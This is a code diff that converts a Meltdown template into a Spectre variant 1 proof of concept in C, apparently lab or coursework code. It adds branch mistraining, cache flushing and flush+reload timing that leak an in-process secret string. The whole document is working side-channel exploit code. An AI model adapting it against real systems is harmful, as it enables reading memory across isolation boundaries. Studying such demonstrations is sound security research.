@@ -49,23 +49,21 @@ alloc_memory() {
     size[0] = 0x1000;
     array_size = &size[0];
     memset(secret, 97, 100);
+    strcpy(secret, "abcdefgh");
 }
 
 
-// do meltdown; a template..
-int meltdown_logic(int *idx,
+// the varient 1 dangerous code.
+int spectre_logic(int idx,
                     Array *cachepad) {
     volatile int i = 0;
     
     // flush array size from cache and load index to access into cache
-    *idx;
-    _mm_clflush(array_size);
-    _mm_mfence();
     
-    if (*idx < *array_size && *idx >= 0) {
+    if (idx < *array_size && idx >= 0) {
         // excute the following line speculatively
         // will access cachepad indexed by secret[idx]
-        i &= cachepad[some_array[*idx]].data[0];
+        i &= cachepad[some_array[idx]].data[0];
     }
     
     return i;
@@ -112,6 +110,14 @@ reload_fastest(uint64_t *p_timing) {
     return min_idx;
 }
 
+void mistrain_bp() {
+	for (int k = 0; k < 256; k++) {
+		//*branch_variable = k;	
+		//spectre_logic(*branch_variable, scratchpad);
+		spectre_logic(k, scratchpad);
+	}
+    	_mm_mfence();
+}
 
 void
 spectre() {
@@ -120,27 +126,33 @@ spectre() {
 
     volatile char c;
 
-    for (int i = 0; i < 64; i++) {
+    for (int i = 0; i < 8*6; i++) {
         usleep(1000);
 
         flush_all();
-
-	volatile int malicious_x = (secret - some_array);	
-	volatile int training_x = 0;	
+	//mistrain_bp();
+	
+	volatile uint64_t malicious_x = (secret - some_array) + (i / 6);	
+	volatile uint64_t training_x = 0;	
 	*branch_variable = ((i%6)-1)&~0xFFFF;
 	*branch_variable = (*branch_variable|(*branch_variable>> 16)); 
 	*branch_variable = training_x ^ (*branch_variable & (malicious_x ^ training_x));
+    	
+	_mm_clflush(array_size);
+    	_mm_mfence();
+	spectre_logic(*branch_variable, scratchpad);
+    	_mm_mfence();
         
-	meltdown_logic(branch_variable, scratchpad);
-
-        uint64_t min_timing = 0;
+	uint64_t min_timing = -1ul;
         uint64_t min_index = reload_fastest(&min_timing);
         if (min_timing > 100) {
             i--;
             continue;
 	} 
-        buffer[i] = (char)(min_index);
-    	printf("Secret: %d\n", min_index);
+        
+	buffer[i] = (char)(min_index);
+    	if (*branch_variable != 0) 	
+		printf("Secret: %d\n", min_index);
     }
 }
 
